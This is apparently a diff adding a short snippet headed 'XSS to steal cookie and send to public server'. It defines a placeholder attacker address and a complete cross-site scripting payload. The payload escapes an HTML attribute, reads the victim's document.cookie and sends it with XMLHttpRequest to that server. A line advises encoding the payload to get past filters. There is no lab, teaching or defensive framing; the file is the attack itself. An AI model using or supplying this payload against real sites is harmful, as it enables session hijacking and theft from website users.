@@ -1,0 +1,6 @@
+XSS to steal cookie and send to public server
+encode payload if you are having trouble with it
+
+$ip_port = "xxx.xxx.xxx.xxx:xxxx"
+$payload = "'>hello<script>var cookie=encodeURI(document.cookie);var xmlHttp=new XMLHttpRequest();xmlHttp.open('GET','".$ip_port."/'+cookie,true);xmlHttp.onload=function(e){if(xmlHttp.readyState===4){if(xmlHttp.status===200){console.log('0');}else{console.error('1');}}};xmlHttp.onerror=function(e){console.error('2');};console.log('');xmlHttp.send(cookie);</script>goodbye<img src='";
+
